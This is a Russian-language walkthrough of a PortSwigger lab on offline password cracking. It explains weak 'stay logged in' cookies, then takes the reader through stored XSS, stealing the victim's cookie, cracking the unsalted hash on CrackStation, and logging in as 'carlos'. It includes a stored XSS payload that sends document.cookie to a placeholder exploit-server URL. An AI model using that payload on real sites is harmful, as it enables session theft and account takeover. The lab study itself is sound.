# Offline password cracking

## Theory

<h3>Сохранение входа пользователей</h3>

Некоторые веб-сайты предполагают, что если файл cookie каким-то образом зашифрован, его нельзя будет угадать, даже если он использует статические значения. Это может быть правдой, если все сделано правильно, "шифрование" файла cookie с использованием простого двустороннего кодирования, такого как Base64, не обеспечивает никакой защиты. Даже правильное шифрование с односторонней хеш-функцией не является полностью надежным. Если злоумышленник может легко идентифицировать алгоритм хеширования и не использовать соль, он потенциально может взломать файл cookie, просто хешировав свои списки слов. Этот метод можно использовать для обхода ограничений на попытки входа в систему, если аналогичный лимит не применяется к догадкам файлов cookie.

Даже если злоумышленник не сможет создать собственную учетную запись, он все равно сможет воспользоваться этой уязвимостью. Используя обычные методы, такие как XSS, злоумышленник может украсть файл cookie другого пользователя и вывести из него, как создается файл cookie. Если веб-сайт был создан с использованием платформы с открытым исходным кодом, ключевые детали создания файлов cookie могут быть даже публично задокументированы.

В некоторых редких случаях можно получить фактический пароль пользователя в открытом виде из файла cookie, даже если он хеширован. Хэшированные версии известных списков паролей доступны в интернете, поэтому, если пароль пользователя появляется в одном из этих списков, расшифровка хэша иногда может быть такой же тривиальной, как просто вставка хэша в поисковую систему. Это демонстрирует важность соли в эффективном шифровании.

## Writeup

* Имеющиеся данные: 
    * Данные нашего пользователя: wiener:peter
    * Данные атакуемого пользователя: carlos

Главная страница:

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/Authetication/Offline_password_cracking/assets/1.png)

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/Authetication/Offline_password_cracking/assets/2.png)

Страница аутентификации:

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/Authetication/Offline_password_cracking/assets/3.png)

Вводим данные нашего пользователя, нажимаем на кнопку "Stay logged in".

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/Authetication/Offline_password_cracking/assets/4.png)

Во вкладке **HTTP History** найдем GET запрос /my-account. Рядом в окне откроем **Inspector** и перейдем к значению cookie. Он автоматически декодирует его. Возьмем значение хэша и вставим его в crackstation для расшифровки.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/Authetication/Offline_password_cracking/assets/5.png)

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/Authetication/Offline_password_cracking/assets/6.png)

Теперь мы знаем как формируется cookie. Открыв любой пост на странице, в конце можно обнаружить поле для комментария. Проверим наличие XSS. Вводим данный скрипт и нажимаем на кнопку "Post Comment".
```
<img src=1 onerror=alert(alert) />
```

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/Authetication/Offline_password_cracking/assets/7.png)

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/Authetication/Offline_password_cracking/assets/8.png)

Нажимаем на кнопку "Back to blog". Можем заметить, что приложение обработало наш сприпт и выдало реультат.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/Authetication/Offline_password_cracking/assets/9.png)

Сверху страницы есть кнопка с редиректом на наш сервер для эксплоита уязвимости.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/Authetication/Offline_password_cracking/assets/10.png)

Копируем URL.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/Authetication/Offline_password_cracking/assets/11.png)

Перейдем к другому посту к панели комментария. Теперь же наш скрипт будет выглядеть следующим образом.
```
<script>document.location="URL_of_our_exploit_server"+document.cookie</script>
```

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/Authetication/Offline_password_cracking/assets/12.png)

Отправляем скрипт и получаем следующий ответ.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/Authetication/Offline_password_cracking/assets/13.png)

Перейдем к нашему серверу для эксплоита и найдем кнопку "Access log".

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/Authetication/Offline_password_cracking/assets/14.png)

Нажав на нее, мы перейдем к панели, где можем заметить cookie жертвы.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/Authetication/Offline_password_cracking/assets/15.png)

Декодируем в base64.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/Authetication/Offline_password_cracking/assets/16.png)

Отправим хэшированное значение в crackstation.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/Authetication/Offline_password_cracking/assets/17.png)

Логинимcя под Carlos.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/Authetication/Offline_password_cracking/assets/18.png)

Удаляем пользователя и получаем ответ от сервера.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/Authetication/Offline_password_cracking/assets/19.png)
